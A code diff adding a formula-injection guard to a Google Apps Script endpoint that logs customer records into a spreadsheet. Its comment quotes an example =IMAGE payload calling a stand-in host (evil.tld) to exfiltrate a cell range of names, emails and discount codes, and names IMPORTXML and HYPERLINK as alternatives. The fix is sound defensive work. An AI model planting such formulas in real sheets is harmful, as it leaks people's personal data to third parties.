@@ -154,10 +154,32 @@ function ok_(obj) {
   return ContentService.createTextOutput(JSON.stringify(obj)).setMimeType(ContentService.MimeType.JSON);
 }
 
+/* FORMULA INJECTION GUARD. Apps Script treats a written string beginning with =, +, -
+   or @ as a LIVE FORMULA. This endpoint is deployed "Anyone" and its URL ships in
+   public JavaScript, so every value below is attacker-controllable — and this sheet
+   holds names, work emails, store names, 21+ attestations and live discount codes.
+
+   A name of  =IMAGE("https://evil.tld/?d="&JOIN(",",B2:D500))  fires the moment a staff
+   member opens the sheet, with no click, and exfiltrates the range to a third party.
+   IMPORTXML and HYPERLINK do the same. The Raw log is the worse half: the attacker
+   controls the ENTIRE body there, so a body that is simply =IMAGE(...) fails JSON.parse,
+   lands in the catch, and is appended verbatim.
+
+   Prefixing an apostrophe forces Sheets to treat the value as text. Chosen over a
+   number-format change because the apostrophe survives copy/paste and CSV export, which
+   is how this data actually leaves the sheet. Tab and CR are included because both can
+   start a formula once Sheets trims. */
+function safe_(v) {
+  if (v instanceof Date) return v;                 // real dates must stay dates
+  if (typeof v === "number" || typeof v === "boolean") return v;
+  var str = String(v == null ? "" : v);
+  return /^[=+\-@\t\r]/.test(str) ? "'" + str : str;
+}
+
 function logRaw_(raw, error) {
   try {
     var sh = sheet_(LOG_NAME, ["Received", "Body", "Error"]);
-    sh.appendRow([new Date(), String(raw).slice(0, 4000), error || ""]);
+    sh.appendRow([new Date(), safe_(String(raw).slice(0, 4000)), safe_(error || "")]);
   } catch (ignore) { /* the log must never be the reason an event is lost */ }
 }
 
@@ -206,7 +228,7 @@ function upsert_(sh, cols, key, fill, set) {
   var fresh = !row;
   if (fresh) {
     row = Math.max(sh.getLastRow() + 1, 2);
-    sh.getRange(row, cols["Certificate ID"]).setValue(key);
+    sh.getRange(row, cols["Certificate ID"]).setValue(safe_(key));
     if (cols["First seen"]) sh.getRange(row, cols["First seen"]).setValue(new Date());
   }
   Object.keys(fill || {}).forEach(function (h) {
@@ -214,10 +236,10 @@ function upsert_(sh, cols, key, fill, set) {
     if (!c) return;
     var cell = sh.getRange(row, c);
     var cur = cell.getValue();
-    if (cur === "" || cur === null) cell.setValue(fill[h]);
+    if (cur === "" || cur === null) cell.setValue(safe_(fill[h]));
   });
   Object.keys(set || {}).forEach(function (h) {
-    if (cols[h]) sh.getRange(row, cols[h]).setValue(set[h]);
+    if (cols[h]) sh.getRange(row, cols[h]).setValue(safe_(set[h]));
   });
   if (cols["Last event"]) sh.getRange(row, cols["Last event"]).setValue(new Date());
   return row;
